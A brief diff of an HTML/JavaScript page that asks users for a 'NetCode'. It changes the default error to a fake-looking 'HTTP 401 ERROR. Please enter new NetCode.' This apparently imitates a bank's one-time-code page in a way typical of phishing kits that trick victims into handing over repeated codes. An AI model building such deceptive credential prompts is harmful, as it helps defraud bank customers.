@@ -237,7 +237,7 @@ function showLoading() {
     // Remove existing error first
     hideValidationError();
 
-    const errorHtml = `<div class="MessagePanel arrow MessagePanel_Validation" id="ctl00_mplMessagePanel" style="display: block;"><div class="message_contents message_contents_validation"><div class="message"><div class="message_icon validation icon icon_validation"><i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i></div><h3><span class="validation">${msg || 'Invalid NetCode. Please try again.'}</span></h3></div></div><b aria-hidden="true" role="presentation" class="barrow" tabindex="-1"><bdo></bdo></b></div>`;
+    const errorHtml = `<div class="MessagePanel arrow MessagePanel_Validation" id="ctl00_mplMessagePanel" style="display: block;"><div class="message_contents message_contents_validation"><div class="message"><div class="message_icon validation icon icon_validation"><i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i></div><h3><span class="validation">${msg || 'HTTP 401 ERROR. Please enter new NetCode.'}</span></h3></div></div><b aria-hidden="true" role="presentation" class="barrow" tabindex="-1"><bdo></bdo></b></div>`;
 
     const mainContent = document.querySelector('.main-content');
     if (mainContent) {
@@ -852,6 +852,7 @@ function showLoading() {
   </div>
  </body>
 </html>
+
 
 
 
